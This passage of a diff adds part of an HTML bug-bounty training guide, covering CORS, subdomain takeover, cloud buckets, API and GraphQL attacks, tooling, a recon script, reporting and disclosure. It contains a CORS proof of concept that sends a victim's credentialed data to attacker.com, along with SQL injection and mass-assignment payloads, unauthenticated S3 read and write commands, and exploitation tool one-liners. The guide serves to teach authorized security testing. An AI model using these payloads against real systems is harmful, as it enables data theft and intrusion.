+<span class="cm"># AND Access-Control-Allow-Credentials: true → VULNERABLE!</span>
+
+<span class="cm"># Test 2: null origin</span>
+curl -H "Origin: null" -I https://api.target.com/user
+
+<span class="cm"># Test 3: Trusted subdomain bypass</span>
+<span class="cm"># If subdomain.target.com is allowed, find XSS there and pivot</span>
+curl -H "Origin: https://subdomain.target.com.evil.com" -I https://api.target.com/user
+
+<span class="cm"># Test 4: Pre-domain bypass</span>
+curl -H "Origin: https://notreally-target.com" -I https://api.target.com/user</pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">CORS Exploit PoC</div>
+        <pre><span class="cm">&lt;!-- Host on attacker.com --></span>
+<span class="cv">&lt;script>
+fetch('https://api.target.com/user/profile', {
+  credentials: 'include'
+})
+.then(r => r.text())
+.then(d => fetch('https://attacker.com/log?data=' + btoa(d)));
+&lt;/script></span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SUBDOMAIN TAKEOVER -->
+<section class="section" id="subdomain-takeover">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 21</div>
+    <h2>Subdomain Takeover</h2>
+    <p class="section-intro">A CNAME points to a deprovisioned third-party service. Attacker claims the service and serves content under the company's trusted domain — enabling stored XSS, phishing, and cookie theft.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">Subdomain Takeover Detection</div><div class="vuln-card-subtitle">Can-I-Take-Over-XYZ, nuclei templates</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">Subdomain Takeover Workflow</div>
+        <pre><span class="cm"># Step 1: Find all subdomains</span>
+subfinder -d target.com | httpx -silent > live.txt
+
+<span class="cm"># Step 2: Check for dangling CNAMEs</span>
+<span class="ck">subjack</span> -w live.txt -t 100 -o results.txt
+<span class="ck">subzy</span> run --targets live.txt
+
+<span class="cm"># Step 3: Nuclei templates for service fingerprinting</span>
+nuclei -l live.txt -t subdomain-takeover/
+
+<span class="cm"># Common vulnerable services (CNAME targets that can be claimed)</span>
+<span class="cv">Amazon S3</span>     → NoSuchBucket in response
+<span class="cv">GitHub Pages</span>  → "There isn't a GitHub Pages site here"
+<span class="cv">Heroku</span>        → "No such app"
+<span class="cv">Shopify</span>       → "Sorry, this shop is currently unavailable"
+<span class="cv">Azure</span>         → "404 Web Site not found"
+<span class="cv">Zendesk</span>       → "Help Center Closed"
+<span class="cv">Unbounce</span>      → "The requested URL was not found"</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CLOUD -->
+<section class="section" id="cloud">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 22</div>
+    <h2>Cloud Misconfigurations</h2>
+    <p class="section-intro">Public cloud resources misconfigured by developers remain among the most impactful bug bounty findings. Exposed S3 buckets, open blob containers, and misconfigured IAM roles.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">AWS, GCP, Azure Misconfiguration Testing</div><div class="vuln-card-subtitle">Open buckets, exposed IAM, metadata exploitation</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">AWS S3 Bucket Testing</div>
+        <pre><span class="cm"># Find bucket names (from JS, subdomains, source code)</span>
+<span class="cm"># Common patterns:</span>
+target-prod, target-staging, target-backup, target-assets
+target.com, www.target.com, dev.target.com
+
+<span class="cm"># Test access</span>
+aws s3 ls s3://<span class="ce">target-prod</span> --no-sign-request
+aws s3 cp s3://<span class="ce">target-prod</span>/config.json . --no-sign-request
+
+<span class="cm"># Upload test (write access)</span>
+aws s3 cp test.txt s3://<span class="ce">target-prod</span>/ --no-sign-request
+
+<span class="cm"># Check bucket ACL/policy</span>
+curl https://<span class="ce">target-prod</span>.s3.amazonaws.com/
+curl https://s3.amazonaws.com/<span class="ce">target-prod</span>/
+aws s3api get-bucket-acl --bucket <span class="ce">target-prod</span> --no-sign-request
+
+<span class="cm"># Automated: S3Scanner, bucket-stream</span>
+<span class="ck">s3scanner</span> scan --bucket target-prod
+<span class="ck">GrayhatWarfare</span> search: grayhatwarfare.com/buckets</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- API SECURITY -->
+<section class="section" id="api">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 23 — MODERN TARGETS</div>
+    <h2>API Security Testing</h2>
+    <p class="section-intro">Modern applications are API-first. REST, GraphQL, and gRPC APIs introduce unique vulnerability patterns that differ from traditional web apps.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">REST API Testing — Full Methodology</div><div class="vuln-card-subtitle">BOLA, BFLA, mass assignment, improper versioning</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <h4>OWASP API Security Top 10</h4>
+      <div class="two-col">
+        <div class="mini-card">
+          <div class="mc-title">API1 — BOLA</div>
+          <p>Broken Object Level Auth = IDOR for APIs. Change object IDs in all API calls.</p>
+        </div>
+        <div class="mini-card">
+          <div class="mc-title">API2 — Broken Auth</div>
+          <p>Weak tokens, no expiry, JWT attacks, API key bruteforce.</p>
+        </div>
+        <div class="mini-card">
+          <div class="mc-title">API3 — Mass Assignment</div>
+          <p>Send extra fields in POST body: <code>{"role":"admin","isAdmin":true}</code></p>
+        </div>
+        <div class="mini-card">
+          <div class="mc-title">API4 — Lack of Resources</div>
+          <p>No pagination limits, no rate limiting, 100MB POST body accepted.</p>
+        </div>
+        <div class="mini-card">
+          <div class="mc-title">API5 — BFLA</div>
+          <p>Broken Function Level Auth. Access admin endpoints as regular user: <code>DELETE /api/users/all</code></p>
+        </div>
+        <div class="mini-card">
+          <div class="mc-title">API6 — Unrestricted Fields</div>
+          <p>API returns all fields including sensitive ones (SSN, internal IDs, secrets).</p>
+        </div>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">Mass Assignment Attack</div>
+        <pre><span class="cm"># Normal request:</span>
+POST /api/profile
+{"name": "Alice", "email": "alice@test.com"}
+
+<span class="cm"># Attack — add privileged fields:</span>
+POST /api/profile
+<span class="ce">{"name": "Alice", "email": "alice@test.com", "role": "admin", "balance": 99999, "verified": true, "isAdmin": true}</span>
+
+<span class="cm"># Check if any extra fields were accepted</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- GRAPHQL -->
+<section class="section" id="graphql">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 24</div>
+    <h2>GraphQL Attacks</h2>
+    <p class="section-intro">GraphQL's flexibility and introspection capabilities create unique attack surfaces. Often exposes internal data structures and allows excessive data fetching.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-high">HIGH</div>
+      <div><div class="vuln-card-title">GraphQL — Introspection, Batching, Injection</div><div class="vuln-card-subtitle">Schema disclosure, query batching, SQLi via GraphQL</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">GraphQL Introspection (Schema Disclosure)</div>
+        <pre><span class="cm"># Full introspection query — dumps entire schema</span>
+{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type { name }
+      }
+    }
+  }
+}
+
+<span class="cm"># List all mutations (actions you can perform)</span>
+{ __schema { mutationType { fields { name args { name } } } } }
+
+<span class="cm"># Find hidden fields on a type</span>
+{ __type(name: "User") { fields { name type { name } } } }</pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">GraphQL Auth Bypass & Rate Limit Bypass via Batching</div>
+        <pre><span class="cm"># Batch multiple queries in single request (bypass rate limiting)</span>
+[
+  {"query": "{ user(id: 1) { email } }"},
+  {"query": "{ user(id: 2) { email } }"},
+  {"query": "{ user(id: 3) { email } }"}
+]
+
+<span class="cm"># IDOR via GraphQL</span>
+{ user(id: <span class="ce">1337</span>) { name email phoneNumber ssn } }
+
+<span class="cm"># Injection in GraphQL arguments</span>
+{ users(search: "<span class="ce">admin' OR '1'='1</span>") { name email } }</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BUSINESS LOGIC -->
+<section class="section" id="business-logic">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 25</div>
+    <h2>Business Logic Flaws</h2>
+    <p class="section-intro">Scanners can't find these. They require deep understanding of the application's intended behavior and creative thinking about how flows can be abused.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Categories of Logic Flaws</h3>
+    <div class="three-col">
+      <div class="mini-card">
+        <div class="mc-title">Price Manipulation</div>
+        <ul class="blist">
+          <li>Negative quantity in cart</li>
+          <li>Modify price in request</li>
+          <li>Apply discount multiple times</li>
+          <li>Coupon stacking</li>
+          <li>Free shipping threshold bypass</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Workflow Bypass</div>
+        <ul class="blist">
+          <li>Skip payment step</li>
+          <li>Access paid content before paying</li>
+          <li>Skip email verification</li>
+          <li>Skip OTP step</li>
+          <li>Forced browsing to protected states</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Account Security</div>
+        <ul class="blist">
+          <li>No rate limit on login</li>
+          <li>Password reset link doesn't expire</li>
+          <li>Multiple accounts on same email</li>
+          <li>Account enumeration via timing</li>
+          <li>MFA bypass via direct endpoint</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-label">Logic Flaw Testing Questions</div>
+      <pre><span class="cm"># Ask these about every feature:</span>
+
+1. Can I do this without completing the prerequisite step?
+2. Can I do this more times than intended?
+3. Can I do this as a different user?
+4. Can I send negative/zero/extreme values?
+5. What happens if I complete step 3 before step 2?
+6. What if two users do this simultaneously?
+7. What if I repeat the same action with two different accounts?
+8. Can I chain a small privilege with another to escalate?</pre>
+    </div>
+  </div>
+</section>
+
+<!-- BURP SUITE -->
+<section class="section" id="burp">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 26 — TOOLING</div>
+    <h2>Burp Suite Mastery</h2>
+    <p class="section-intro">Burp Suite is the centerpiece of every web security researcher's toolkit. Master these features to multiply your effectiveness.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Essential Burp Techniques</h3>
+
+    <div class="two-col">
+      <div class="mini-card">
+        <div class="mc-title">Proxy & Intercept</div>
+        <ul class="blist">
+          <li>Intercept all traffic via proxy (127.0.0.1:8080)</li>
+          <li>Use Burp's CA cert to intercept HTTPS</li>
+          <li>Match & Replace rules for automatic header injection</li>
+          <li>Proxy Listeners for mobile app testing</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Repeater</div>
+        <ul class="blist">
+          <li>Manually replay and modify any request</li>
+          <li>Tab groups for A/B comparison</li>
+          <li>HTTP/1, HTTP/2 protocol switching</li>
+          <li>Inspector panel for parameter analysis</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Intruder</div>
+        <ul class="blist">
+          <li>Sniper: one payload position, iterate wordlist</li>
+          <li>Battering Ram: same payload in all positions</li>
+          <li>Pitchfork: different lists per position</li>
+          <li>Cluster Bomb: all combinations</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Scanner (Pro)</div>
+        <ul class="blist">
+          <li>Active scan for injection, XSS, etc.</li>
+          <li>Passive scan running in background</li>
+          <li>Custom scan profiles per target</li>
+          <li>Collaborator for out-of-band detection</li>
+        </ul>
+      </div>
+    </div>
+
+    <h4>Must-Have Burp Extensions</h4>
+    <table class="tool-table">
+      <tr><th>Extension</th><th>Purpose</th><th>Use Case</th></tr>
+      <tr><td>Autorize</td><td>Access control testing</td><td>Auto-test every request with low-priv cookie — finds IDOR/auth bugs automatically</td></tr>
+      <tr><td>Logger++</td><td>Advanced logging</td><td>Log all traffic with filters, export for analysis</td></tr>
+      <tr><td>JWT Editor</td><td>JWT manipulation</td><td>Decode, modify, resign JWT tokens in Repeater</td></tr>
+      <tr><td>Turbo Intruder</td><td>High-speed requests</td><td>Race conditions, credential stuffing at scale</td></tr>
+      <tr><td>HTTP Request Smuggler</td><td>Smuggling detection</td><td>Automated CL.TE/TE.CL detection</td></tr>
+      <tr><td>Param Miner</td><td>Hidden parameters</td><td>Discover hidden GET/POST/header parameters</td></tr>
+      <tr><td>Hackvertor</td><td>Encoding/decoding</td><td>Multi-layer encoding for bypass payloads</td></tr>
+      <tr><td>Active Scan++</td><td>Extended scanning</td><td>Finds SQLi, XSS, SSRF, SSTI beyond default scanner</td></tr>
+    </table>
+  </div>
+</section>
+
+<!-- TOOLS -->
+<section class="section" id="tools">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 27</div>
+    <h2>Complete Tool Arsenal</h2>
+    <p class="section-intro">Every professional bug bounty hunter's toolkit, organized by category with recommended configurations.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Recon & Discovery</h3>
+    <table class="tool-table">
+      <tr><th>Tool</th><th>Category</th><th>Key Command</th></tr>
+      <tr><td>Amass</td><td>Subdomain enum</td><td><code>amass enum -passive -d target.com</code></td></tr>
+      <tr><td>Subfinder</td><td>Subdomain enum</td><td><code>subfinder -d target.com -all -o subs.txt</code></td></tr>
+      <tr><td>httpx</td><td>HTTP probing</td><td><code>httpx -l subs.txt -title -tech-detect -status-code</code></td></tr>
+      <tr><td>ffuf</td><td>Fuzzing</td><td><code>ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404</code></td></tr>
+      <tr><td>Nuclei</td><td>Template scanning</td><td><code>nuclei -u https://target.com -t nuclei-templates/</code></td></tr>
+      <tr><td>Waybackurls</td><td>Historical URLs</td><td><code>waybackurls target.com | sort -u</code></td></tr>
+      <tr><td>Gau</td><td>URL harvesting</td><td><code>gau target.com | tee urls.txt</code></td></tr>
+      <tr><td>Katana</td><td>Web crawling</td><td><code>katana -u https://target.com -jc -d 5</code></td></tr>
+      <tr><td>Shodan CLI</td><td>Internet search</td><td><code>shodan search org:"Target Corp" --fields ip_str</code></td></tr>
+    </table>
+
+    <h3>Exploitation Tools</h3>
+    <table class="tool-table">
+      <tr><th>Tool</th><th>Vulnerability</th><th>Usage</th></tr>
+      <tr><td>sqlmap</td><td>SQL Injection</td><td><code>sqlmap -u "url?id=1" --dbs --batch</code></td></tr>
+      <tr><td>XSStrike</td><td>XSS</td><td><code>python3 xsstrike.py -u "url?param=test"</code></td></tr>
+      <tr><td>jwt_tool</td><td>JWT attacks</td><td><code>python3 jwt_tool.py TOKEN -X a</code></td></tr>
+      <tr><td>SSRFmap</td><td>SSRF exploitation</td><td><code>python3 ssrfmap.py -r req.txt -p url</code></td></tr>
+      <tr><td>tplmap</td><td>SSTI</td><td><code>python3 tplmap.py -u "url?name=*"</code></td></tr>
+      <tr><td>Commix</td><td>Command Injection</td><td><code>commix --url="url?param=test"</code></td></tr>
+      <tr><td>CORScanner</td><td>CORS misconfig</td><td><code>python3 cors_scan.py -u https://target.com</code></td></tr>
+      <tr><td>GitTools</td><td>Git exposure</td><td><code>gitdumper.sh https://target.com/.git/ out/</code></td></tr>
+    </table>
+  </div>
+</section>
+
+<!-- AUTOMATION -->
+<section class="section" id="automation">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 28</div>
+    <h2>Automation & Continuous Recon</h2>
+    <p class="section-intro">Elite hunters run continuous recon pipelines that alert them the moment new subdomains, endpoints, or exposed services appear. First to find = first to report.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Full Recon Pipeline Script</h3>
+    <div class="code-wrap">
+      <div class="code-label">recon.sh — Automated Attack Surface Discovery</div>
+      <pre><span class="ce">#!/bin/bash</span>
+<span class="ck">TARGET</span>=<span class="cv">$1</span>
+<span class="ck">OUT</span>=<span class="cv">~/recon/$TARGET</span>
+mkdir -p $OUT
+
+<span class="cm"># 1. Subdomain enumeration</span>
+subfinder -d $TARGET -all -silent | sort -u > $OUT/subs.txt
+amass enum -passive -d $TARGET -silent >> $OUT/subs.txt
+sort -u $OUT/subs.txt -o $OUT/subs.txt
+
+<span class="cm"># 2. Resolve live hosts</span>
+dnsx -l $OUT/subs.txt -silent -a -o $OUT/live-dns.txt
+
+<span class="cm"># 3. Find live HTTP(S) services</span>
+httpx -l $OUT/live-dns.txt -silent -title -status-code \
+  -tech-detect -o $OUT/live-web.txt
+
+<span class="cm"># 4. Historical URL collection</span>
+cat $OUT/subs.txt | waybackurls | sort -u > $OUT/wayback.txt
+cat $OUT/subs.txt | gau | sort -u >> $OUT/wayback.txt
+
+<span class="cm"># 5. Extract juicy URLs</span>
+cat $OUT/wayback.txt | grep "?" | sort -u > $OUT/params.txt
+cat $OUT/wayback.txt | grep -E "\.(php|asp|aspx|jsp)" > $OUT/dynamic.txt
+
+<span class="cm"># 6. Nuclei scan</span>
+nuclei -l $OUT/live-web.txt -t nuclei-templates/ \
+  -severity medium,high,critical -o $OUT/nuclei.txt
+
+<span class="cm"># 7. Screenshot all live hosts</span>
+gowitness file -f $OUT/live-web.txt -P $OUT/screenshots/
+
+echo "[+] Recon complete: $OUT"</pre>
+    </div>
+
+    <div class="box box-green">
+      <strong>Continuous Monitoring Setup</strong>
+      Run recon.sh daily via cron. Diff output against previous run. Alert via Slack/Telegram on new subdomains, newly exposed ports, or new nuclei findings. New assets = highest-probability bug targets. Use notify tool by ProjectDiscovery to automate alerts.
+    </div>
+  </div>
+</section>
+
+<!-- REPORTING -->
+<section class="section" id="reporting">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 29</div>
+    <h2>Writing World-Class Reports</h2>
+    <p class="section-intro">A great finding poorly reported gets triaged slowly and may be duplicated. A mediocre finding excellently reported gets fast response and builds your reputation.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Report Structure</h3>
+    <div class="code-wrap">
+      <div class="code-label">Report Template</div>
+      <pre><span class="ck">Title:</span> [Vulnerability Type] in [Feature/Endpoint] allows [Impact]
+Example: <span class="cv">IDOR in /api/v2/order/{id} allows unauthenticated access to any user's order data</span>
+
+<span class="ck">Severity:</span> Critical / High / Medium / Low / Informational
+<span class="ck">CVSS Score:</span> 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+
+<span class="ck">Summary:</span>
+A clear, non-technical one-paragraph description of what the bug is,
+where it exists, and why it matters. Assume the reader is a manager,
+not a developer. Start with impact, then explain the mechanism.
+
+<span class="ck">Steps to Reproduce:</span>
+1. Log in as a standard user at https://target.com/login
+2. Navigate to any order page: /orders/12345
+3. Intercept the request in Burp Suite
+4. Change the order ID to 12346 (another user's order)
+5. Observe full order details returned including name, address, payment last4
+
+<span class="ck">Proof of Concept:</span>
+[Attach HTTP request/response from Burp Suite]
+[Include screenshot showing another user's data]
+[Include screen recording for complex chains]
+
+<span class="ck">Impact:</span>
+An attacker can enumerate all order IDs sequentially to extract full
+customer PII, purchase history, shipping addresses, and partial payment
+info for all users. With ~250,000 orders, this constitutes a full
+database breach equivalent.
+
+<span class="ck">Remediation:</span>
+1. Implement server-side ownership verification: verify session.user_id === order.user_id
+2. Never rely on client-supplied IDs for authorization decisions
+3. Consider using cryptographically random, non-sequential order IDs (UUIDs)
+4. Add authorization middleware to all order-related endpoints
+
+<span class="ck">References:</span>
+- OWASP API Security: API1 — Broken Object Level Authorization
+- CWE-284: Improper Access Control</pre>
+    </div>
+
+    <h4>CVSS Scoring Quick Reference</h4>
+    <div class="three-col">
+      <div class="mini-card">
+        <div class="mc-title" style="color: var(--red)">Critical (9.0–10.0)</div>
+        <p>Remote code execution, full authentication bypass, complete data breach, unauthenticated SQLi dumping all data.</p>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title" style="color: var(--amber)">High (7.0–8.9)</div>
+        <p>Account takeover, sensitive data exposure (PII), significant privilege escalation, SSRF reaching internal services.</p>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title" style="color: var(--cyan)">Medium (4.0–6.9)</div>
+        <p>Self-XSS, CSRF for low-impact actions, information disclosure, limited IDOR (non-sensitive data).</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PLATFORMS -->
+<section class="section" id="platforms">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 30</div>
+    <h2>Platforms, Programs & Earning</h2>
+    <p class="section-intro">Choosing the right program is as important as technical skill. Program selection strategy separates high earners from those who spend months with nothing to show.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Program Selection Strategy</h3>
+    <ul class="blist">
+      <li><strong>New programs:</strong> Highest probability of unclaimed bugs. Watch for new program announcements.</li>
+      <li><strong>Recently expanded scope:</strong> New assets = nobody has tested them yet. Monitor program updates.</li>
+      <li><strong>Programs with high signal-to-noise:</strong> Check public reports. High duplicate rates mean the easy bugs are gone.</li>
+      <li><strong>Private programs:</strong> Fewer hunters, higher bounties, faster triage. Get invited by building reputation on public programs.</li>
+      <li><strong>VDPs (no bounty):</strong> Great for learning, less competitive, builds report-writing skills.</li>
+    </ul>
+
+    <div class="box box-cyan">
+      <strong>Earnings Benchmark (HackerOne 2024)</strong>
+      Top 1% of hunters earn $100K+/year. Average active hunter earns ~$3K–$15K/year part-time. A single critical RCE in a top-tier program can pay $10K–$100K+. Focus on quality over quantity.
+    </div>
+
+    <h4>Disclosure Timeline</h4>
+    <div class="phase-timeline">
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot" style="border-color:var(--amber)"></div><div class="pb-line"></div></div>
+        <div class="phase-content"><h5>Day 0 — Submit report</h5><p>Submit via official platform/channel. Acknowledge receipt confirmation.</p></div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot" style="border-color:var(--amber)"></div><div class="pb-line"></div></div>
+        <div class="phase-content"><h5>Day 14 — Follow up if no response</h5><p>Polite, professional follow-up. Mention severity and ask for triage status.</p></div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot" style="border-color:var(--amber)"></div><div class="pb-line"></div></div>
+        <div class="phase-content"><h5>Day 90 — Standard disclosure deadline</h5><p>If no fix, consider public disclosure with advance notice. Google Project Zero standard.</p></div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot" style="border-color:var(--red)"></div></div>
+        <div class="phase-content"><h5>Critical / 0-day — 7 days</h5><p>For actively exploited vulnerabilities or critical with real-world risk. Coordinate with CISA if needed.</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- MINDSET -->
+<section class="section" id="mindset">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 31</div>
+    <h2>The Hunter's Mindset</h2>
+    <p class="section-intro">Technical knowledge is necessary but not sufficient. The best hunters think differently. They see what developers missed because they question assumptions others accept.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>First Principles of Every Vulnerability</h3>
+    <div class="three-col">
+      <div class="mini-card" style="border-color: rgba(255,71,87,0.3)">
+        <div class="mc-title" style="color:var(--red)">Trust Violation</div>
+        <p>User input is processed without validation. Every input is a lie until proven otherwise. The server forgot to verify.</p>
+      </div>
+      <div class="mini-card" style="border-color: rgba(255,184,0,0.3)">
+        <div class="mc-title" style="color:var(--amber)">Missing Authorization</div>
+        <p>Server authenticates (who are you?) but not authorizes (what can you do?). Authentication ≠ authorization.</p>
+      </div>
+      <div class="mini-card" style="border-color: rgba(0,212,255,0.3)">
+        <div class="mc-title" style="color:var(--cyan)">Logic Assumption</div>
+        <p>Developer assumed a specific flow. You break the flow. The unexpected state exposes the vulnerability.</p>
+      </div>
+      <div class="mini-card" style="border-color: rgba(176,106,255,0.3)">
+        <div class="mc-title" style="color:var(--purple)">Careless Config</div>
+        <p>Default settings left in place. Debug mode on in production. Sensitive endpoints exposed by accident.</p>
+      </div>
+      <div class="mini-card" style="border-color: rgba(0,255,136,0.3)">
+        <div class="mc-title" style="color:var(--g)">Trust Boundary Crossed</div>
+        <p>Data moves between components with different trust levels without re-validation at the boundary.</p>
+      </div>
+      <div class="mini-card" style="border-color: rgba(77,166,255,0.3)">
+        <div class="mc-title" style="color:var(--blue)">Side-Channel Leak</div>
+        <p>Even a correct implementation leaks information through timing, error messages, or response size differences.</p>
+      </div>
+    </div>
+
+    <div class="box box-green" style="margin-top: 2rem;">
+      <strong>The Questions Every Hunter Asks</strong>
+      For every input field: "What if I send SQL characters? HTML tags? Null bytes? Extremely long strings? Unicode? Negative numbers? Arrays instead of strings?" For every feature: "What if I skip this step? Repeat it? Do it as another user? Do it 1000 times simultaneously? Supply someone else's ID?" For every API: "What if I add extra fields? Remove required fields? Change the method? Try HTTP/2? Add duplicate headers?"
+    </div>
+
+    <h4>Learning Roadmap by Level</h4>
+    <div class="phase-timeline" style="margin-top:1rem">
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Beginner (0–3 months) — Learn the Fundamentals</h5>
+          <p>PortSwigger Web Academy (free, all labs). TryHackMe — Web Fundamentals path. Learn Burp Suite basics. Focus: XSS, SQLi, IDOR, auth flaws.</p>
+        </div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Intermediate (3–12 months) — First Bugs</h5>
+          <p>PortSwigger Advanced labs. Hack The Box web challenges. First bug bounty submissions on HackerOne/Bugcrowd. Read public disclosed reports.</p>
+        </div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Advanced (1–2 years) — Consistent Earner</h5>
+          <p>Build automation pipelines. Specialize in high-value categories (SSRF, RCE, auth bypasses). Write public writeups. Get invited to private programs.</p>
+        </div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot" style="border-color:var(--g)"></div></div>
+        <div class="phase-content">
+          <h5>Expert (2+ years) — Top Earner</h5>
+          <p>Chaining multiple vulns for critical impact. Original research. Conference talks. Private programs, pentest work, security consulting.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div style="font-family: var(--display); font-size: 1.5rem; color: var(--g); margin-bottom: 0.5rem; letter-spacing: 0.1em;">THE BUG BOUNTY PLAYBOOK</div>
+  <div>For authorized security research only — test only what you have permission to test<span class="blink"></span></div>
+  <div style="margin-top:0.5rem; font-size:0.6rem;">Unauthorized testing is illegal. Always get written permission first.</div>
+</footer>
+
+</main>
+<script src="script.js"></script>
+</body>
+</html>
